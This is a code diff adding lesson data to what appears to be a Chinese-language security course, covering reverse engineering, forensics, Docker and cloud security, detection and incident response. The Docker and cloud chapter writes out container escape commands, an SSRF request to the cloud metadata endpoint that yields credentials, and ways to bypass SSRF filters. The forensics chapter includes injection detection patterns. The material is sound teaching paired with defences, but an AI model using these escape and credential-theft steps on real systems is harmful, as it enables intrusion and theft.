+       why:'x86-64 里函数参数走 rdi、rsi。在 call strcmp 之前停下，用 x/s 把两个寄存器当字符串打印，你就同时看到了「你输入的」和「正确的」。这比猜快一百倍。',
+       out:'两个字符串：一个是你的输入，另一个就是答案。',
+       hints:['先 disassemble main 找 call 指令的地址，再在那个地址下断点。','peda / pwndbg 插件会让 gdb 好用很多：apt install gdb-peda。']},
+      {title:'从攻击者转到开发者视角',
+       cmd:'# 客户端校验 = 没有校验\n# 正确做法：把判断放到服务端，客户端只提交结果',
+       why:'crackme 里的 strcmp 能被绕过，现实里的序列号校验、VIP 判断也一样。只要判断发生在客户端，改一个跳转指令（jne → je）就破了。真正的安全边界必须在服务端。',
+       out:'能说出至少一个你见过的「客户端判断」被绕过的例子。',
+       hints:['NOP 掉一条指令、改一个跳转，是最常见的 patch 手法。','混淆和加壳只提高门槛，不改变「客户端不可信」这个事实。']}
+    ],
+    pitfalls:[
+      '直接上 IDA 看几万行伪代码，不知道从哪下手——先用 strings 找线索。',
+      'PIE 程序用固定地址下断点，每次都断不到。',
+      '把「绕过本地校验」当成「攻破了系统」，忽略服务端才是真正的边界。'
+    ],
+    quiz:{q:'在 Linux x86-64 上调用 strcmp(a, b)，a 和 b 分别放在哪个寄存器？',
+      opts:['rax 和 rbx','rdi 和 rsi','rsp 和 rbp','rcx 和 rdx'],
+      a:1, exp:'System V AMD64 调用约定：前六个整型参数依次放 rdi、rsi、rdx、rcx、r8、r9。所以断在 call 之前看 rdi/rsi 就能拿到两个字符串。'}
+  },
+  {
+    id:'l6-2', title:'Ghidra：把汇编还原成能读的逻辑', time:'35 分钟', level:'进阶',
+    tags:['Ghidra','反编译','伪代码'],
+    goal:[
+      '导入二进制并让 Ghidra 自动分析',
+      '在反编译窗口定位 main 与关键校验函数',
+      '用重命名和改类型把伪代码读顺'
+    ],
+    concepts:[
+      {t:'反编译', d:'把机器指令还原成类 C 伪代码。不是完美还原，但足以看懂逻辑分支。'},
+      {t:'符号与类型', d:'变量名默认是 local_18、undefined4。你手动改名、改类型后，整段代码会突然变得可读——这是逆向里性价比最高的动作。'},
+      {t:'交叉引用 XREF', d:'谁调用了这个函数、谁读了这个字符串。顺着 XREF 走，就能从「提示语」一路找到「校验逻辑」。'}
+    ],
+    steps:[
+      {title:'建工程、导入、等自动分析',
+       cmd:'ghidra           # 启动后 New Project → Non-Shared\n# File → Import File → 选中 crackme → Analyze',
+       why:'自动分析会识别函数边界、字符串、调用关系。等它跑完（右下角进度条消失）再开始看，否则你会看到一堆未识别的字节。',
+       out:'左侧 Symbol Tree 里出现 Functions、Strings 等分类。',
+       hints:['第一次启动要设 JDK 路径，Kali 里一般已配好。','分析卡住时检查文件是否加壳，加壳程序要先脱壳。']},
+      {title:'从字符串反查代码',
+       cmd:'# Window → Defined Strings → 双击 "Wrong"\n# 在反编译窗口看它的 XREF，跳转到引用它的函数',
+       why:'这是最省力的入口：找到提示语，看谁引用它，就找到了校验函数。比从 main 一行行读快得多，也是真实逆向工作的常态路径。',
+       out:'一个函数体，里面有 strcmp 或逐字符比较的循环。',
+       hints:['按 Ctrl+Shift+F 可以全程序搜索字符串。','XREF 面板里选 CODE 类型的那条，DATA 只是数据引用。']},
+      {title:'重命名，让伪代码说人话',
+       cmd:'# 右键变量 → Rename Variable（L）\n# 右键函数 → Edit Function Signature\n# 把 local_18 改成 input_buf，把 FUN_00101234 改成 check_password',
+       why:'伪代码难读，一半是因为名字没有语义。改完名之后，if (strcmp(input_buf, secret) == 0) 一眼就看懂了。这个习惯会让你的分析速度快好几倍。',
+       out:'一段读起来像正常 C 代码的校验逻辑。',
+      hints:['先改函数名，再改参数名，最后改局部变量，从粗到细。','不确定类型时先按字节数组读，看到字符串再改成 char*。']},
+      {title:'验证你的理解',
+       cmd:'# 用正确的输入跑一次，确认逻辑判断与你的分析一致\n# 再构造一个边界输入，看是否走到你预测的分支',
+       why:'逆向最大的风险是「自以为看懂了」。用实际运行结果反证你的理解，是唯一可靠的办法。安全评估也一样：能复现的才叫漏洞。',
+       out:'预测的分支与实际执行一致。',
+       hints:['在 gdb 里配合断点验证，比反复试输入更快。','记下你走过的弯路，写报告时这些细节很有价值。']}
+    ],
+    pitfalls:[
+      '不看字符串直接读 main，在几万行伪代码里迷路。',
+      '把 Ghidra 的输出当源码，忽略编译器优化造成的失真。',
+      '分析完不记录函数用途，第二天全忘。'
+    ],
+    quiz:{q:'逆向时从「字符串」入手的好处是什么？',
+      opts:['字符串一定是密钥','提示语/错误信息会通过交叉引用直接指向校验逻辑','字符串能直接运行','可以跳过反编译'],
+      a:1, exp:'字符串是天然的锚点，XREF 能把你从「用户可见的提示」直接带到「做判断的代码」，比从入口顺序阅读高效得多。'}
+  }
+  ]
+},
+
+/* ================= 第 7 章 ================= */
+{
+  id:'m7', no:'7', icon:'🧪', name:'数字取证与应急响应', short:'数字取证',
+  desc:'把「被入侵过」变成可复现的证据链：镜像、恢复、内存、时间线。',
+  lessons:[
+  {
+    id:'l7-1', title:'磁盘取证：从 dd 镜像到文件恢复', time:'40 分钟', level:'进阶',
+    tags:['dd','foremost','autopsy','证据链'],
+    goal:[
+      '用 dd 做只读镜像并计算哈希',
+      '用 foremost 从镜像里恢复被删文件',
+      '说清「证据链」为什么比技术本身更重要'
+    ],
+    concepts:[
+      {t:'写保护', d:'取证第一原则：绝不在原始介质上操作。所有分析都在副本上进行，否则证据在法律上可能不被采信。'},
+      {t:'哈希校验', d:'镜像前后各算一次 SHA-256，两者一致才能证明「这份镜像没被动过」。这就是证据链的技术基础。'},
+      {t:'文件雕刻', d:'删除只是把目录项标记为空，数据还在。foremost 按文件头尾特征（jpg 的 FFD8、pdf 的 %PDF）把文件「雕」出来。'}
+    ],
+    steps:[
+      {title:'先做镜像，再算哈希',
+       cmd:'sudo dd if=/dev/sdb of=/cases/usb.img bs=4M status=progress\nsha256sum /cases/usb.img | tee /cases/usb.sha256',
+       why:'if 是来源、of 是输出，bs=4M 提高速度，status=progress 让你知道还要多久。算哈希是为了证明完整性——没有哈希的镜像是「没法证明没被动过」的证据。',
+       out:'一个 img 文件 + 一份 sha256 记录，镜像前后哈希一致。',
+       hints:['镜像存到另一块盘，别存回原盘，否则会覆盖证据。','bs 太大反而慢，4M 是常用折中值。'],
+       try:{need:['dd','if='], hint:'dd 需要 if（输入）和 of（输出）两个参数。'}},
+      {title:'挂载副本，只看不改',
+       cmd:'sudo mount -o ro,loop /cases/usb.img /mnt/case\nls -la /mnt/case\nsudo umount /mnt/case',
+       why:'-o ro 是只读挂载，loop 让普通文件表现得像块设备。这一步保证你在浏览时不会意外修改文件时间戳——时间戳一旦变了，时间线分析就废了。',
+       out:'能看到原始目录结构，且挂载为只读。',
+       hints:['ext4 记得加 noload，避免日志回放修改镜像。','Windows 镜像用 ewfmount 或 xmount 更专业。'],
+       try:{need:['-o','ro'], hint:'挂载时要指定只读选项。'}},
+      {title:'恢复被删的文件',
+       cmd:'foremost -t all -i /cases/usb.img -o /cases/out\nls -R /cases/out | head -40',
+       why:'-t all 表示恢复所有支持的类型，也可以只挑 jpg,doc,pdf。恢复出来的文件按类型分目录存放。注意：恢复成功率和删除后写入量成反比，越早镜像越好。',
+       out:'out 目录下出现 jpg/、pdf/、audit.txt 等。',
+      hints:['foremost 只按文件头尾特征，碎片化严重的文件可能恢复不全。','photorec 交互式更强，适合单个文件精修。'],
+       try:{need:['foremost'], hint:'按文件特征恢复文件的工具。'}},
+      {title:'用 Autopsy 建时间线',
+       cmd:'autopsy        # 浏览器打开 http://localhost:9999/autopsy\n# New Case → Add Data Source → 选镜像 → Ingest',
+       why:'Autopsy 会解析文件系统、提取 EXIF、还原删除记录，并生成按时间排序的活动列表。案件里最有说服力的往往不是某个文件，而是「几点几分发生了什么」这条线。',
+       out:'一份按时间排序的文件活动列表。',
+      hints:['Ingest 模块全开会很慢，先只开 Recent Activity 和 Hash Lookup。','时区一定要在建 Case 时设对，否则时间线整体偏移。']}
+    ],
+    pitfalls:[
+      '直接在原始磁盘上操作，证据被污染。',
+      '不记哈希、不记操作日志，报告无法自证。',
+      '忽略时区，时间线全错。'
+    ],
+    quiz:{q:'取证时对原始介质的第一条铁律是？',
+      opts:['先杀毒再分析','先做完整镜像并计算哈希，所有分析都在副本上进行','先恢复被删文件','先格式化确保干净'],
+      a:1, exp:'原始介质必须保持原样。镜像是工作副本，哈希用来证明副本与原件一致，这是证据可采信的前提。'}
+  },
+  {
+    id:'l7-2', title:'内存与日志：还原攻击时间线', time:'45 分钟', level:'进阶',
+    tags:['volatility','日志','IOC','时间线'],
+    goal:[
+      '用 volatility3 从内存镜像里取出进程与网络连接',
+      '在 Linux 日志里定位登录与 Web 攻击痕迹',
+      '把零散事件排成一条可解释的时间线'
+    ],
+    concepts:[
+      {t:'内存取证', d:'进程、命令行、网络连接、注入的代码都只在内存里。关机就全没了——所以应急响应第一反应不该是「赶紧关机」。'},
+      {t:'IOC', d:'入侵指标：恶意 IP、文件名、注册表键、命令行特征。它们是检测规则的原料。'},
+      {t:'时间线', d:'单条日志说明不了什么，但「22:13 登录失败 300 次 → 22:15 登录成功 → 22:16 新建账号」就是完整故事。'}
+    ],
+    steps:[
+      {title:'先看内存里跑着什么',
+       cmd:'python3 vol.py -f /cases/mem.raw windows.pslist\npython3 vol.py -f /cases/mem.raw windows.netscan',
+       why:'pslist 列进程树，异常的父进程（比如 cmd.exe 的父进程是 word.exe）就是钓鱼的典型特征；netscan 列连接，一个陌生外网 IP 的 ESTABLISHED 连接往往就是 C2。',
+       out:'进程列表 + 连接列表，重点看父子关系异常和外部连接。',
+       hints:['先跑 windows.info 确认 profile/版本，版本错了很多插件会失败。','pstree 看层级比 pslist 更直观。'],
+       try:{need:['vol.py'], hint:'volatility3 的可执行入口是 vol.py。'}},
+      {title:'把可疑进程的内存抠出来',
+       cmd:'python3 vol.py -f /cases/mem.raw windows.memmap --pid 4321 --dump\nstrings pid.4321.dmp | grep -iE "http|password|cmd"',
+       why:'进程内存里常留着明文配置、URL、甚至完整命令历史。dump 出来再 strings，是最快拿到「它在跟谁通信」的方法。',
+       out:'内存转储文件，以及其中提取出的 URL / 字符串。',
+      hints:['malfind 可以先筛出「可疑注入内存段」，再针对性 dump。','别把 dump 文件传到公网分析平台，里面可能有真实数据。']},
+      {title:'在日志里找登录与 Web 痕迹',
+       cmd:'sudo grep -i "Failed password" /var/log/auth.log | tail -20\nsudo grep -c "Failed password" /var/log/auth.log\ngrep -E "union|select|\\.\\./|%00" /var/log/nginx/access.log | head',
+       why:'auth.log 记录 SSH 登录成功与失败；access.log 记录每一个 HTTP 请求。统计失败次数能识别爆破，搜索特征串能定位注入尝试——日志是最便宜也最容易被忽略的检测手段。',
+       out:'失败次数统计、可疑请求样本、成功登录的来源 IP。',
+       hints:['失败几百次后紧跟一条 Accepted，基本就是爆破成功了。','日志被清空时，看 /var/log/wtmp、last 命令、以及 journald 的持久化目录。'],
+       try:{need:['auth.log'], hint:'Linux 登录日志的路径。'}},
+      {title:'拼成时间线',
+       cmd:'# 建议表格：时间 | 主机 | 事件 | 证据来源 | 置信度',
+       why:'把内存、日志、文件时间戳放同一张表里按时间排序，攻击链就自己浮出来了。写报告时，这条线比任何技术细节都更有说服力。',
+       out:'一条从初始访问到横向移动的完整时间线。',
+       hints:['时间统一成 UTC 再换算本地时间，别混着写。','每条事件都要标证据来源，否则复盘时无法验证。']}
+    ],
+    pitfalls:[
+      '一出事就关机，内存证据全丢。',
+      '只看 access.log，忽略 auth.log 和 systemd journal。',
+      '日志时间没对齐时区，时间线前后矛盾。'
+    ],
+    quiz:{q:'发生入侵后，为什么不应该立刻关机？',
+      opts:['关机太慢','内存中的进程、连接、注入代码会丢失，而它们是最关键的证据','关机后硬盘会坏','关机需要管理员权限'],
+      a:1, exp:'内存是易失证据。正确顺序是：隔离网络（拔网线）→ 抓内存 → 做磁盘镜像 → 再考虑重启或恢复。'}
+  }
+  ]
+},
+
+/* ================= 第 8 章 ================= */
+{
+  id:'m8', no:'8', icon:'☁️', name:'云与容器安全', short:'云与容器',
+  desc:'Docker 逃逸面、公开存储桶、SSRF 打元数据——云时代最常见的三类事故。',
+  lessons:[
+  {
+    id:'l8-1', title:'Docker 安全：特权容器约等于 root', time:'35 分钟', level:'进阶',
+    tags:['Docker','逃逸','capabilities','加固'],
+    goal:[
+      '用 docker inspect 判断一个容器有多危险',
+      '解释 --privileged 与挂载 docker.sock 的逃逸原理',
+      '写出四条容器加固基线'
+    ],
+    concepts:[
+      {t:'容器不是虚拟机', d:'容器共享宿主内核，靠 namespace 做隔离、cgroup 限资源。内核一出问题，隔离就漏了。'},
+      {t:'特权模式', d:'--privileged 给容器几乎所有 capability 并放开设备访问，等于把宿主内核的控制权交出去。'},
+      {t:'docker.sock', d:'挂载了 /var/run/docker.sock 的容器，可以直接指挥宿主的 Docker 守护进程——起一个新容器挂载宿主根目录，就逃出去了。'}
+    ],
+    steps:[
+      {title:'先看容器到底有多大权限',
+       cmd:'docker ps\ndocker inspect dvwa | grep -iE "Privileged|CapAdd|Binds|PidMode|NetworkMode"',
+       why:'Privileged:true、CapAdd 里有 SYS_ADMIN、Binds 挂了 /var/run/docker.sock 或 /，都是高危信号。审计容器安全，80% 靠这一条命令。',
+       out:'一份权限配置，标出所有高危项。',
+       hints:['docker inspect 输出是 JSON，用 jq 过滤更清爽。','--network host 的容器能直接看到宿主所有网卡，也是风险项。'],
+       try:{need:['docker','inspect'], hint:'查看容器完整配置的命令。'}},
+      {title:'理解逃逸是怎么发生的',
+       cmd:'# 特权容器内：\nmount /dev/sda1 /mnt && chroot /mnt sh\n# 或挂载了 sock：\ndocker run -v /:/host -it alpine chroot /host sh',
+       why:'容器里能看到宿主磁盘设备、又能 mount，就能把宿主根文件系统挂进来，然后 chroot 进去——你已经站在宿主上了。这不是「Docker 漏洞」，是配置把门打开了。',
+       out:'在容器内拿到宿主机的文件系统视图。',
+       hints:['只在你自己搭的测试环境验证，生产环境做这个等于入侵。','capsh --print 可以看当前容器实际拥有的 capability。']},
+      {title:'加固：四条能落地的规则',
+       cmd:'docker run --user 1000:1000 --read-only --cap-drop ALL --security-opt no-new-privileges myapp',
+       why:'--user 非 root 运行；--read-only 根文件系统只读；--cap-drop ALL 收回所有能力（按需再加）；no-new-privileges 防止通过 setuid 提权。四条一起用，逃逸面大幅收窄。',
+       out:'同样尝试逃逸，全部被拒绝。',
+       hints:['需要写临时文件就挂一个 tmpfs：--tmpfs /tmp。','镜像构建阶段就用非 root 用户，比运行时改更彻底。']},
+      {title:'把检查变成日常',
+       cmd:'# 准入控制：K8s 用 PodSecurity / OPA Gatekeeper 禁止 privileged\n# 扫描：trivy image myapp:latest',
+       why:'靠人肉 review 迟早漏。用策略在「部署前」拦住特权容器，用镜像扫描在「上线前」拦住已知漏洞，才是可规模化的做法。',
+       out:'一条策略 + 一份扫描报告。',
+       hints:['trivy 也能扫配置文件（IaC），提前发现 Dockerfile 里的问题。','基线参考 CIS Docker Benchmark，条目多但挑高优先级先做。']}
+    ],
+    pitfalls:[
+      '为了「跑得通」直接加 --privileged，把安全债留给未来。',
+      '容器里跑 root，还挂着宿主目录。',
+      '只扫镜像不扫配置，特权容器照样上线。'
+    ],
+    quiz:{q:'为什么挂载 /var/run/docker.sock 进容器约等于给了宿主 root？',
+      opts:['因为它是普通文件','因为容器可以通过它指挥宿主 Docker 守护进程，创建挂载宿主根目录的新容器','因为它会泄露环境变量','因为 Docker 会重启'],
+      a:1, exp:'docker.sock 是守护进程的控制接口，有它就能创建特权容器并挂载宿主 /，从而完全控制宿主机。这是 CI 环境里最常见的高危配置。'}
+  },
+  {
+    id:'l8-2', title:'云上最常见的两个错：公开桶与元数据 SSRF', time:'35 分钟', level:'进阶',
+    tags:['S3','SSRF','IMDS','IAM'],
+    goal:[
+      '检查一个对象存储桶是否对匿名用户开放',
+      '解释 SSRF 如何通过 169.254.169.254 拿到云凭据',
+      '说出 IMDSv2 与最小权限 IAM 的防护作用'
+    ],
+    concepts:[
+      {t:'公开桶', d:'对象存储默认私有，但「为了方便」改成 public-read 的桶，会把备份、日志、用户数据直接暴露在互联网上。'},
+      {t:'SSRF', d:'服务端请求伪造：你让服务器替你去访问一个地址。如果服务器在云上，它就能访问你访问不到的内网和元数据接口。'},
+      {t:'元数据服务', d:'169.254.169.254 是云主机的「内部信息台」，能返回实例角色凭据。拿到它，往往等于拿到云账号的一部分权限。'}
+    ],
+    steps:[
+      {title:'匿名检查存储桶',
+       cmd:'aws s3 ls s3://bucket-name --no-sign-request\ncurl -s https://bucket-name.s3.amazonaws.com/ | head',
+       why:'--no-sign-request 表示不带任何凭据访问。如果还能列出文件，说明桶是公开的——这就是典型的数据泄露事故，而且极其常见。',
+       out:'文件列表，或 403 AccessDenied（说明是私有的）。',
+      hints:['只能检查你自己或已授权组织的桶，扫别人的桶属于未授权访问。','不同云厂商域名不同：OSS 是 oss-cn-xxx.aliyuncs.com。'],
+       try:{need:['--no-sign-request'], hint:'aws cli 里表示不带签名（匿名）访问的参数。'}},
+      {title:'从一个 URL 参数想到元数据',
+       cmd:'# 假设某功能会抓取用户提交的图片地址：\nPOST /fetch  url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+       why:'服务器收到这个地址会真的去请求，而它自己在云内网里，于是把「实例角色名」返回给你。再请求一次带上角色名，就能拿到 AccessKey、SecretKey、Token——完整的临时凭据。',
+       out:'返回角色名，随后返回一组临时凭据 JSON。',
+       hints:['先测能不能访问外网（http://example.com），确认存在 SSRF，再打内网地址。','内网常见目标还有 127.0.0.1:6379、10.0.0.0/8 的各类管理口。']},
+      {title:'防护：把「能访问」变成「不能访问」',
+       cmd:'# 1) 强制 IMDSv2（需要 token + PUT 请求）\n# 2) 实例角色最小权限，不给 *\n# 3) 出站限制：只允许必要的域名\n# 4) URL 白名单 + 禁止解析到内网 IP',
+       why:'IMDSv2 要求先拿 token 再访问，普通 SSRF 很难完成；最小权限让「拿到凭据」也没那么大价值；出站白名单和 SSRF 过滤是在应用层再拦一道。多层叠加才可靠。',
+       out:'同样的 SSRF 请求返回 401 或超时。',
+      hints:['只做「禁止 169.254.169.254」字符串过滤很容易被 0xA9FEA9FE、302 跳转绕过。','DNS rebinding 也能绕过基于域名的白名单，解析时要有二次校验。']},
+      {title:'把它变成一条检查清单',
+       cmd:'# 桶：是否 public / 是否开日志 / 是否加密\n# 角色：权限是否 * / 是否长期密钥\n# 元数据：是否强制 v2',
+       why:'云安全的绝大部分问题不是「攻破」，而是「配置错了」。把高频错误做成固定检查项，比每次靠经验靠谱得多。',
+       out:'一份可复用的云配置自查表。',
+      hints:['云厂商都有配置合规检查服务（Security Hub、Config），先开起来。','长期 AccessKey 是最危险的东西，能换临时凭据就换。']}
+    ],
+    pitfalls:[
+      '为了测试方便把桶设成 public-read，然后忘了改回来。',
+      '以为「内网地址外网访问不到」就安全，忘了服务器自己就在内网。',
+      'IAM 图省事给 AdministratorAccess，一个 SSRF 就全丢了。'
+    ],
+    quiz:{q:'SSRF 为什么能拿到云主机凭据？',
+      opts:['因为元数据接口没有密码','因为服务器本身在云内网，能访问 169.254.169.254 这个只有内网可达的地址','因为云厂商有后门','因为 HTTP 协议不安全'],
+      a:1, exp:'元数据服务只对实例内部开放。攻击者借服务器的「身份」去请求它，从而绕过网络边界。IMDSv2 与最小权限 IAM 是主要缓解手段。'}
+  }
+  ]
+},
+
+/* ================= 第 9 章 ================= */
+{
+  id:'m9', no:'9', icon:'🛡️', name:'蓝队与安全运营', short:'蓝队与运营',
+  desc:'攻击者视角学完了，换到防守方：日志、检测规则、应急响应六步。',
+  lessons:[
+  {
+    id:'l9-1', title:'日志与检测：把一次攻击变成一条告警', time:'40 分钟', level:'进阶',
+    tags:['SIEM','日志','检测规则','误报'],
+    goal:[
+      '知道 Linux 与 Web 的关键日志在哪、记什么',
+      '用命令行做一次基线统计',
+      '写一条可落地的暴力破解检测规则'
+    ],
+    concepts:[
+      {t:'日志三件套', d:'auth.log（登录）、access.log（Web 请求）、syslog/journal（系统事件）。缺一样，故事就断一节。'},
+      {t:'基线', d:'先知道「正常长什么样」，才认得出异常。失败登录平时 5 次/天，突然 500 次/小时就是信号。'},
+      {t:'检测规则', d:'把「什么条件下告警」写清楚：时间窗口、阈值、聚合维度。规则太松全是误报，太紧就漏。'}
+    ],
+    steps:[
+      {title:'先找到日志在哪',
+       cmd:'ls -lh /var/log/\nsudo tail -n 30 /var/log/auth.log\nsudo journalctl -u ssh --since "1 hour ago"',
+       why:'不同发行版路径略有差异，但 auth.log / secure、access.log、journal 是通用入口。先能读到日志，才谈得上检测。',
+       out:'能看到近期的登录事件与 SSH 会话记录。',
+       hints:['CentOS 系是 /var/log/secure，不是 auth.log。','journalctl 默认不持久化，重启就没了，生产环境要开 Storage=persistent。'],
+       try:{need:['journalctl'], hint:'systemd 的日志查询命令。'}},
+      {title:'做一次基线统计',
+       cmd:"sudo grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head",
+       why:'按来源 IP 聚合失败次数，一眼看出谁在敲门。awk 取字段、sort | uniq -c 计数、再倒序排——这三件套是日志分析的基本功，比装一堆工具更快。',
+       out:'一张「IP → 失败次数」排行表。',
+       hints:['字段位置因日志格式而异，先 tail 看两行确认 $NF-3 是不是 IP。','统计时间窗口要固定，否则「次数多」没有意义。'],
+       try:{need:['uniq','-c'], hint:'统计重复次数用 uniq 的计数参数。'}},
+      {title:'把它写成一条规则',
+       cmd:'# 伪规则（Sigma 思路）：\n# 同一源 IP，5 分钟内 Failed password >= 20 次 → 高危告警\n# 再加：失败后紧跟 Accepted → 疑似爆破成功（严重）',
+       why:'检测的价值在于「失败后成功」这个组合——单看失败只是有人在猜，失败后成功说明猜对了。规则的杀伤力来自关联，不是阈值本身。',
+       out:'一条能说清「触发条件 + 严重级别 + 处置建议」的规则。',
+       hints:['先在做实验的靶机上打一遍，确认规则真的会响。','阈值要按业务调，别直接抄别人的 20 次。']},
+      {title:'验证与降噪',
+       cmd:'# 在靶机上制造 30 次失败登录，确认告警触发\n# 记录误报来源（运维脚本、监控探活），加白名单',
+       why:'没验证过的规则等于没有。误报会让人关掉告警，最后真出事没人看——这是安全运营里最真实的失败模式。',
+       out:'规则触发记录 + 一份误报白名单。',
+       hints:['白名单要写清原因和到期时间，否则会变成永久后门。','告警里带上原始日志链接，处置的人不用再去翻服务器。']}
+    ],
+    pitfalls:[
+      '只收集不分析，日志堆成山却没人看。',
+      '规则阈值照抄，业务一变更就全是误报。',
+      '忽略「失败后成功」这种高价值组合信号。'
+    ],
+    quiz:{q:'相比「5 分钟内失败 20 次」，「失败多次后紧接着登录成功」这条规则的价值在于？',
+      opts:['更容易写','它关联了两个事件，指向「已经猜对了密码」，处置优先级更高','它能减少日志量','它不需要阈值'],
+      a:1, exp:'失败只是尝试，失败后成功意味着账号可能已失守，需要立即响应（改密、隔离、排查）。关联检测比单点阈值更有决策价值。'}
+  },
+  {
+    id:'l9-2', title:'应急响应六步：从发现到复盘', time:'35 分钟', level:'进阶',
+    tags:['IR','应急','隔离','复盘'],
+    goal:[
+      '记住应急响应的六个阶段与各阶段目标',
+      '理解「隔离」与「关机」的区别',
+      '写出一份可执行的事件复盘模板'
+    ],
+    concepts:[
+      {t:'PICERL', d:'准备 Preparation、发现 Identification、抑制 Containment、根除 Eradication、恢复 Recovery、复盘 Lessons Learned。'},
+      {t:'隔离而非关机', d:'拔网线/改安全组能阻断横向，同时保住内存。关机等于销毁最关键的证据。'},
+      {t:'复盘', d:'不是追责会，而是回答「为什么没早发现、怎么让下次更早发现」。'}
+    ],
+    steps:[
+      {title:'准备阶段：平时就该做好的事',
+       cmd:'# 资产清单 / 日志留存 90 天 / 应急联系人 / 离线备份 / 演练',
+       why:'事件发生时没有时间做准备。资产不清就不知道影响范围，日志没留就无从追溯，备份被加密就只能付赎金。应急能力是平时攒出来的。',
+       out:'一份可执行的应急手册（谁负责、怎么联系、第一步做什么）。',
+       hints:['离线备份要定期做恢复演练，没恢复过的备份不算备份。','把「第一个小时做什么」写成一页纸，贴在显眼处。']},
+      {title:'发现与确认：先判断真假与范围',
+       cmd:'# 确认：告警是否真实？影响哪些主机/账号/数据？\n# 记录：时间、来源、现象、已做动作',
+       why:'误报很常见，先花 10 分钟确认真伪，再决定是否升级。同时开始记录——应急过程的时间线本身就是复盘的核心材料。',
+       out:'一份初始事件记录，含影响范围初判。',
+      hints:['用「有没有异常外联、有没有新增账号、有没有异常进程」三条快速判断。','别一上来就全公司通报，先确认真实性。']},
+      {title:'抑制：断开但不销毁',
+       cmd:'# 隔离主机：改安全组 / 拔网线 / 禁用账号\n# 保留：先抓内存镜像，再做磁盘镜像\n# 不要：直接关机、直接重装',
+       why:'抑制的目标是「让攻击者动不了」，同时「保住证据」。重装系统会让你永远不知道是怎么进来的，下次照样中招。',
+       out:'攻击被阻断，且关键证据已保存。',
+      hints:['隔离前先看有没有加密外传行为，避免打草惊蛇。','保留一份「未清理」的副本给取证，别急着删恶意文件。']},
+      {title:'根除、恢复与复盘',
+       cmd:'# 根除：补漏洞、删后门、改全部相关口令\n# 恢复：从干净备份还原，灰度上线并加强监控\n# 复盘：时间线 + 根因 + 改进项（含负责人和期限）',
+       why:'很多二次入侵就发生在「恢复之后」——因为根因没除。复盘要落到具体的改进项上，而不是一句「加强安全意识」。',
+       out:'一份含根因、改进项、责任人的复盘报告。',
+       hints:['改进项要可验证：不是「加强监控」，而是「30 天内上线 SSH 爆破告警」。','复盘会不追责个人，否则以后没人敢上报。']}
+    ],
+    pitfalls:[
+      '一出事就关机重装，根因永远查不出来。',
+      '只处理被入侵的那台，忘了同网段其他主机。',
+      '复盘写成检讨会，改进项没有负责人和期限。'
+    ],
+    quiz:{q:'发现主机被入侵，第一优先的动作通常是？',
+      opts:['立刻关机','隔离网络并保存内存等易失证据','重装系统','删除可疑文件'],
+      a:1, exp:'先阻断横向移动，同时保住内存这类一关机就没的证据。关机、重装、删文件都会破坏现场，让根因无法查明。'}
+  }
+  ]
+},
+
+/* ================= 第 10 章 ================= */
+{
+  id:'m10', no:'10', icon:'🏁', name:'CTF 与成长路线', short:'CTF 与路线',
+  desc:'用 CTF 把零散技能串成肌肉记忆，再用一份 90 天计划把学习变成习惯。',
+  lessons:[
+  {
+    id:'l10-1', title:'CTF 五类题型 + 90 天成长路线', time:'25 分钟', level:'入门',
+    tags:['CTF','靶场','学习路线'],
+    goal:[
+      '说清 Web / Pwn / Reverse / Crypto / Misc 五类题型考什么',
+      '按自己的基础选一条起步路径',
+      '拿到一份可执行的 90 天计划'
+    ],
+    concepts:[
+      {t:'Web', d:'SQL 注入、XSS、文件包含、反序列化、SSRF。最适合入门，因为反馈快、工具链成熟。'},
+      {t:'Pwn', d:'二进制漏洞利用：栈溢出、格式化字符串、堆。需要汇编与调试功底，门槛最高，回报也最大。'},
+      {t:'Reverse', d:'逆向分析找 flag 或算法。练的是耐心和读代码的能力。'},
+      {t:'Crypto', d:'古典密码、RSA 常见误用、格密码。数学好的人上手快。'},
+      {t:'Misc', d:'杂项：流量分析、隐写、编码转换、取证。最像真实工作的一类。'}
+    ],
+    steps:[
+      {title:'先挑一类打透，别五类都碰',
+       cmd:'# 建议起点：Web（反馈快）或 Misc（门槛低、趣味强）',
+       why:'新手最大的问题是「什么都学一点，什么都不会」。先用一类题建立「我能做出来」的正反馈，再扩展。技能是迁移的，信心不迁移。',
+       out:'选定一个主攻方向，并写下选择理由。',
+       hints:['有编程基础选 Web，有汇编基础选 Reverse / Pwn。','完全零基础就从 Misc 的编码题开始，20 分钟能做出第一题。']},
+      {title:'选对靶场，按难度爬坡',
+       cmd:'# 入门：DVWA、Juice Shop、PortSwigger Web Security Academy（免费）\n# 进阶：TryHackMe 路径、VulnHub 单机\n# 实战：HackTheBox、CTF 比赛',
+       why:'难度跨度太大最容易劝退。PortSwigger 的免费实验环境按漏洞类型分级，每关都有明确目标，是最适合打基础的 Web 靶场。',
+       out:'一个账号 + 一条按难度排序的练习清单。',
+       hints:['每道题做完写三行笔记：考什么、卡在哪、下次怎么更快。','别直接看 writeup，卡 30 分钟再看，收益最大。']},
+      {title:'90 天计划（可调整）',
+       cmd:'第 1-2 周：Linux + 网络基础 + 搭靶场\n第 3-4 周：信息收集 + nmap + Burp\n第 5-7 周：Web 四大漏洞（注入/XSS/上传/越权）\n第 8-9 周：口令、提权、内网基础\n第 10-11 周：打 3 台完整靶机，写 3 份报告\n第 12 周：复盘 + 参加一次 CTF',
+       why:'这个顺序遵循「先能看懂 → 再能动手 → 最后能串起来」。每周留一天复盘，比多刷两套题更有用——不复盘的经验只是重复。',
+       out:'一张写进日历的计划表，每周有明确产出物。',
+       hints:['每周产出物要具体：一份笔记、一台靶机、一份报告。','计划断掉不可怕，别因为断了两天就整个放弃。']},
+      {title:'把笔记写成「可复用」的样子',
+       cmd:'# 模板：场景 → 判断依据 → 命令 → 结果 → 如果重来我会怎么做',
+       why:'笔记不是抄命令，是记录「我当时怎么想的」。三个月后你需要的不是那条命令，而是「遇到这种响应该往哪想」的判断力。',
+       out:'一个可搜索的笔记库，按漏洞类型分类。',
+       hints:['用 grep 能搜到才有价值，标题写清关键词。','把失败的尝试也记下来，那才是最值钱的部分。']},
+      {title:'最后一条：技术之外的东西',
+       cmd:'# 授权文件 / 测试范围 / 报告能力 / 沟通能力',
+       why:'渗透测试是一份需要信任的工作。同样的技术，能写清风险、能跟业务方沟通、能守住法律边界的人，才走得远。技术决定下限，职业素养决定上限。',
+       out:'一份自己的测试授权模板与报告模板。',
